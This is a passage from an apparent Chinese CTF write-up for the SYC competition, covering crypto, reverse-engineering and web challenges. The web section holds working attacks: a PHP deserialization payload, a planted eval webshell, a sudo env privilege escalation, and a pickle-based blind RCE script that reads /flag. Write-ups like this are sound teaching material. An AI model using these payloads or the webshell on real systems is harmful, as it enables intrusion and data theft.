python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">h0 = <span class="number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line">n1 = <span class="number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line">h1 = <span class="number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span></span><br><span class="line">h2 = <span class="number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span></span><br><span class="line">n2 = <span class="number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line">c = <span class="number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">q = GCD(n1, <span class="built_in">pow</span>(<span class="number">2024</span>,n1,n1)-h0)</span><br><span class="line"></span><br><span class="line">primelist = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>,<span class="number">2</span>**<span class="number">13</span>) <span class="keyword">if</span> isPrime(i)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(primelist))</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> primelist:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> primelist:</span><br><span class="line">        g = GCD(n2, <span class="built_in">abs</span>(b*h1-a*h2))</span><br><span class="line">        <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">            p = g</span><br><span class="line"></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;492aebb6-9c16-4b1a-ac42-fc608bf6063f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h3><blockquote><p>听Bingfeng师傅说他的ez_pop很难，要不试试这个更简单的?</p></blockquote><p>pop链构造，传给Syclover参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lhRaMK7</span>:</span><br><span class="line">    public_love=<span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Starven</span>:</span><br><span class="line">    public_friend=lhRaMK7()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SYC</span>:</span><br><span class="line">    public_forever=Starven()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parar</span>:</span><br><span class="line">    private_execurise=<span class="string">&#x27;man!&#x27;</span></span><br><span class="line">    public_hansome=SYC()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Starven</span>:</span><br><span class="line">    public_girl=Parar()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lhRaMK7</span>:</span><br><span class="line">    public_Do=Starven()</span><br><span class="line">    public_You=SYC()</span><br><span class="line"></span><br><span class="line">s = serialize(lhRaMK7())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(s[:-<span class="number">1</span>].encode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tzo3OiJsaFJhTUs3IjoyOntzOjI6IkRvIjtPOjc6IlN0YXJ2ZW4iOjE6e3M6NDoiZ2lybCI7Tzo1OiJQYXJhciI6Mjp7czoxNjoiAFBhcmFyAGV4ZWN1cmlzZSI7czo0OiJtYW4hIjtzOjc6ImhhbnNvbWUiO086MzoiU1lDIjoxOntzOjc6ImZvcmV2ZXIiO086NzoiU3RhcnZlbiI6MTp7czo2OiJmcmllbmQiO086NzoibGhSYU1LNyI6MTp7czo0OiJsb3ZlIjtzOjEzOiJzeXN0ZW0oImlkIik7Ijt9fX19fXM6MzoiWW91IjtPOjM6IlNZQyI6MTp7czo3OiJmb3JldmVyIjtyOjU7fQ==</span></span><br></pre></td></tr></table></figure><p>发现存在 disable_function，无法读/flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,system,shell_exec,popens,popen,curl_exec,curl_multi_exec,proc_open,proc_get_status,,readfile,unlink,dl,memory_get_usage,dl,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,linkopen_basedir </span><br></pre></td></tr></table></figure><p>更换命令为 <code>file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);&quot;);</code> 写马，蚁剑连接，使用绕过 disable_function 插件，测试使用PHP7_Backtrace_UAF可以成功执行命令。</p><p><code>sudo -l</code> 发现：<code>NOPASSWD: /usr/bin/env</code></p><blockquote><p>env -C ：在指定目录下执行指定命令，并设置相应的环境变量。例如，输入”env -C /usr/bin ls”命令会在/usr/bin目录下执行ls命令。</p></blockquote><p>提权读/flag：<code>sudo /usr/bin/env -C cat /flag</code></p><p>​    </p><h3 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h3><blockquote><p>五个月前，道心破碎，于是便出了这道题，你能治愈当时的我破碎的心灵吗？我会给你flag作为奖励……</p></blockquote><p>注册，登录，提示：<code>Error!!!! give you hint: maybe you can view /starven_s3cret</code>。</p><p>访问 <code>/starven_s3cret</code> 下载源码，代码审计，在 <code>/login</code> 路由下，statement传入内容，再触发pickle反序列化。</p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;sleep 3&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>发现可以过黑名单，且成功触发sleep。</p><p>尝试反弹shell不成功，配合RCE盲注拿flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">chars = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">s.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/register&#x27;</span>,data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;y&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload = <span class="string">f&quot;if [ `cut -c <span class="subst">&#123;i&#125;</span> /flag` = \&#x27;<span class="subst">&#123;char&#125;</span>\&#x27; ];then sleep 1;fi&quot;</span></span><br><span class="line">        payload_b64 = base64.b64encode(<span class="string">f&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;\no.&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;statement&#x27;</span>:payload_b64</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = s.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/login&#x27;</span>,data=data,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (char == <span class="string">&#x27;~&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse-3"><a href="#Reverse-3" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><blockquote><p>牢弟很喜欢把秘密藏在乱糟糟的地方不让大家看，你能帮我找找他的秘密吗？</p></blockquote><p><code>main()</code> 函数除花，去掉 <code>db 0E8h</code>，分析逻辑为 AES-CBC加密。</p><p>去反调试 <code>IsDebuggerPresent()</code>，动调得key和iv和密文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = addddb082dd94dcabad5d75639eac9da</span><br><span class="line">iv = 633bbdfb3a2cc6ff5c0862a2cda2eab4</span><br><span class="line">c = dde04c75973314b817b61911618a60234616e21a65c35b2668f5ad30b1ee4bc6abb59ebb73954ac278efcba9be71e1a0</span><br></pre></td></tr></table></figure><p>AES-CBC解密得到flag：<code>SYC&#123;W0w_Y0U_fOUNdDD_TLS_AND_AeS&#125;</code>。</p><p>​    </p><h3 id="贝斯！贝斯！"><a href="#贝斯！贝斯！" class="headerlink" title="贝斯！贝斯！"></a>贝斯！贝斯！</h3><blockquote><p>华强摸了摸你的ida并问到:“你这base保熟吗。”</p></blockquote><p>动调看逻辑：</p><p>第一步变表base58，表：<code>Zix7BucHvEV2UAf5e8hKsNDkQ1pq9gjC6RbFwMyLToSnJYWXdaG3r4Pztm</code>；</p><p>第二步，先结合 <code>sub_4018FF()+sub_4019EE()</code>，RC4，key：<code>happy_happy</code>；</p><p>第三步变表base85，根据RC4打乱码表，表：<code>eM+wr=x8aYZ/[zU$yRB&amp;kbO;%p0P5f*7d(n]1Eug4ojc62AC,v39!h-^qQ.G?s)i:DFlS&lt;&gt;#@HINJTmtKLVWX</code>。</p><p>已知密文：<code>RjB6Myu#,&gt;Bgoq&amp;u.H(nBgdIaOKJbgEYj1GR4S.w：</code></p><p>第一步，base85还原得到：<code>6pmB34FC9sbYxcKP9rjGGiyRsx1s6c72</code>；</p><p>第二步，由于时间戳问题，进入 <code>sub_401550()</code>，提取当前日期的年份、月份和日期，并使用它们来创建随机数生成器的种子。</p><p>生成不同的码表来爆破，写入 <code>table.txt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> Str[<span class="number">68</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(Str, <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);</span><br><span class="line">    <span class="type">int</span> str_len = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="comment">//2024-11-10 00:00:00 = 1731168000</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1735660800</span>;k&gt;=<span class="number">1704038400</span>;k-=<span class="number">86400</span>) &#123;</span><br><span class="line">        <span class="type">int</span> tmp[<span class="number">60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">char</span> table[<span class="number">68</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        srand(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">57</span>; ++i ) &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              j = rand() % str_len;</span><br><span class="line">            <span class="keyword">while</span> ( tmp[j] );</span><br><span class="line">            table[i] = Str[j];</span><br><span class="line">            tmp[j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        table[<span class="number">58</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>,k,table);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;table.txt&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    now = line.strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">int</span>(now[<span class="number">0</span>])</span><br><span class="line">    table = now[<span class="number">1</span>]</span><br><span class="line">    m = base58.b58decode(<span class="string">b&#x27;6pmB34FC9sbYxcKP9rjGGiyRsx1s6c72&#x27;</span>, alphabet=table.encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;SYC&#123;&#x27;</span> <span class="keyword">in</span> m <span class="keyword">or</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(time,table,m)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1725811200 n6KPVUdeqBjQvDG51Nof9uJHW7gRAtLrCcTkXhz2ips3Sb8yFmYa4xZMEw b&#x27;SYC&#123;th1s_ls_an_ez_base&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse-Crypto-1"><a href="#Reverse-Crypto-1" class="headerlink" title="Reverse/Crypto"></a>Reverse/Crypto</h2><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><blockquote><p>离散对数DLP，RSA Modular binomial, base64变表（可与队友联合解题，也可学习些二进制基础，对以后有益），提交的flag格式：flag{xx}</p></blockquote><p>已知输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">c_output=<span class="string">&#x27;d0BURFg2dLNFBLDySWN5RmrUS0k2ejDzdJRLSJkLR0gGBqIVSmR3RLR5RmI1BqRLdqlWemk4Bqr4B0rLdqD0S01HemS0Bqx6d01LS0t2djt5dWO1BLV1Bqr3dL1LSjR6RWk4eq15BFh0R0x6R0OzdWBHSmg3dWg5dmr2RFB6BLDyd0DVRjrHdmg3ejdyeqkHR0gGB0tFRLg4BFBGemNFSJr6BFN3d0IzB0C4B013RjyySJhzRjuydqxFd0D1BjuyemlVS0B6BWk2BLDzejBURml0RLh0RjD0BJR2SWd0BqCLdjN2RFh0RjRHR0uzSj1Ldj1FBWR2R0hySqy0RmS1dg==&#x27;</span></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n1_output=<span class="string">&#x27;BjI1S0t5djR4dj14dWBURFS0ejCFSWIWdJg4BWrLeqDzejgHemSVeq14ejk6RFSzRLtGBjdyS0xGBqB5R0R5RjhyBFr4SjO0dqSzRjxUSmR2d0OyBFrGdFhVS0u1dmhVBJr4Rjr4R0d1BjB4BFIWRLCFSmgGRWBUS0CGSjC5Sj1HeqdzBqS0SjrGRLNUBJSVdjk4eqg2RFRUBqNHS0k4d0g6Sjg5ejD0RFN5BFd1S0DzR0C2ejdVdqBGRLk2Smk5dLR2BLN4BWd0BmNLdjt2BjN4eq13dFlzdWB5eqgLB01UR0g2eqDVdWgLBWrLBjI1SjSWSqSWdJNUSqVVeJSyRx==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c1_output=<span class="string">&#x27;dmrGd0yVeJkLSjhVSWk3BmR3d0S1dLu1SqVyBjB5BWR3BL1HRWBUSjIWRjhVeqNHRWkFRjdzdWIyd0r4emhVBqO0dJlVRLk6dJk6BFOWBqxLdWNGR0N3S0kLdJr2B01GdqhVejx4RWh0BFI0SqtGRjx5BLd0djgLSmr5RFR2S0gFd0lWRWg2dWO0B0I1BLyVSJgFBJrFeqt4BquVBqtUejx4RFI0ejuVBjCUejR5BJIVRFlVSjdzSWR5BLgHBLBUdWr2RFSzBqR5SJRGSqlzRFkURLuWRWrFRmk5dJSzSmI1dmR3dWIyej14S0NLSmkURFOVeJrHSWB4d0S1dmSy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint1_output=<span class="string">&#x27;RLdWSqx2RWlVR0NLd0d1dqr2eqgHSWhydjxUeq1Gd0R6dmO0RWNUd0BGejx6S0xLeqkLRjS0ejSVd0h0eJl0ejgFdqk2BqVzdLCLdWkLR0rHdFl0S01LBJk6ejhWRLg2eJB2RmBFRWSyej12djCGeqB4BJN5d0rURWBUeJg5BLNGdjtGBJR3d0NHdLh0dFS1BLxURWrUSmR2SjC3BqrUd0BLdjRFSjR3RWrUdmk3RjB4SjNURjg3R0tUdLt2RLSyRml1eqVyRjgLBjC3djCHSjxFeq12BmBHBjxFBjr6BJR3BJSVBjx6SjBLR0x4dLC5SjrGBjg6BqkGdjVWBLx4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n2_output=<span class="string">&#x27;BFd0BqCFSjD1Smr4dFRHBLg2Bjx5BqVyRLy0Bmr2dqt6djy0dFhyBqr6B0B5BquWSqN3djB4BLR5BFdVemSWRLdWRmrGdqx6BFr6eJlyBmk6BjIyBLh0BLgUS0N4R0gURWN4Bqg2dLtGdFk2SquWdjrLejN5emkFBWSzej1LdjR6S0uVdLC3SjCUBjV0RFO0dqr2ejkFSjyydWd0BFk4Bjx5BWdydWlzBjC3djx4d0DWSjDWdFB4dWhyd0dVdmgFBjRUSmr3dL14SjxFS0dVBWkHBqh1BL1USqr2B013B0V1BLCLBjtLeJR5BLhVd0rURjD1Smd0Sjr6RWhVdJd1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c2_output=<span class="string">&#x27;BWhVdmg3Bj15RWR6dLVzRjdVRjBLeJO1dqBUBJr5eJg4B0BLSJrUSjC3BJNLRmr6d0g2Rj12B0uVSWRGequzdJgGdJIyBFBGSJBLdqyWB0r2B0gGej1GRmkLBWSzeqR2B0xUBLlVd0r6BLhWemlWd0dVemN3d0O0dqDzdWN4dFBUBjBLRFI1dqRGBWBURmrGS0k5dmgLS0u1BqRGR0R5equ1BLDVdqB2dWB2RmSVRFlySjCLBmBLBjrFRFdWejuyRFI1SJN6RmR2BWg2djV0d0I0SjD1S0uzdjS0SjIVBJOyBjl0S0NHRml1djg5djR5dmIyejBUeJSzdq12Sjlz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint2_output=<span class="string">&#x27;BWh1BLDzBqxFS0I0eJSydLxFBJl1dmd1SjIVBqOyBqR6SjxGB0OySj1HB0B3dLVWdLR2Sql1RjxFSmB6djDzBWhWSmkFejB2dqRLRjCFR0rLBFgGejI0BFdWRWk3S0xHRjgLRWSySjuWB0l0SWNLSmSzd0I0BjDyRjt5BJIydLSVB0N6ejN2Bj1HdWSzBjSWBmIVBLhyeqRGRFNGRWrFdqI1djRLdFNGBJrUB0C6dLgGemkURLrHSqrLdLN4djVydJk4dJrGB01HRLlzB0tUSWrFSqx2RmO0BmN2d0SzB0VzRWrHRjIyBWlyemkHRmg3d0y0BjhyS0rGRLhWdjDV&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint3_output=<span 